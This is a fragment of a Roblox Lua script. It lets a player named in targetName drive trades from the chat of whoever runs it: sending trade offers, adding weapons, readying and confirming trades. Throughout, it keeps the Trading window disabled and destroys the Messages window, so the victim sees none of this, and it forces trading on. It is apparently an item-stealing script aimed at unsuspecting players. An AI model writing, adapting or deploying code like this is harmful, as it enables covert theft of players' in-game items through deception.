-- // Chat handling
TextChatService.OnIncomingMessage = function(message)
	local ts = message.TextSource
	if not ts then return end
	local sender = Players:GetPlayerByUserId(ts.UserId)
	if not sender then return end
	local txt = tostring(message.Text or "")
	txt = txt:match("^%s*(.-)%s*$") or txt

	if sender.Name == targetName then
		local target = Players:FindFirstChild(targetName)
		if target then
			RFTradingSendTradeOffer:InvokeServer(target)
		end
		if txt == "1" then
			RFTradingSetReady:InvokeServer(true)
		elseif txt == "2" then
			RFTradingConfirmTrade:InvokeServer()
		elseif txt:lower() == "add" then
			addWeapons()
		end
	end

	if sender.UserId == localPlayer.UserId then
		if txt == "1" then
			RFTradingSetReady:InvokeServer(true)
		elseif txt == "2" then
			RFTradingConfirmTrade:InvokeServer()
		elseif txt:lower() == "add" then
			addWeapons()
		end
	end
end

-- // GUI handling
local function handleGui(gui)
	if gui.Name == "Trading" then
		gui.Enabled = false
	elseif gui.Name == "Messages" then
		gui:Destroy()
	end
end

for _, gui in ipairs(playerGui:GetChildren()) do
	handleGui(gui)
end

playerGui.ChildAdded:Connect(handleGui)

task.spawn(function()
	while true do
		local tradingGui = playerGui:FindFirstChild("Trading")
		if tradingGui then
			tradingGui.Enabled = false
		end
		task.wait(0.1)
	end
end)

RESetPhoneSettings:FireServer("TradeEnabled", true)
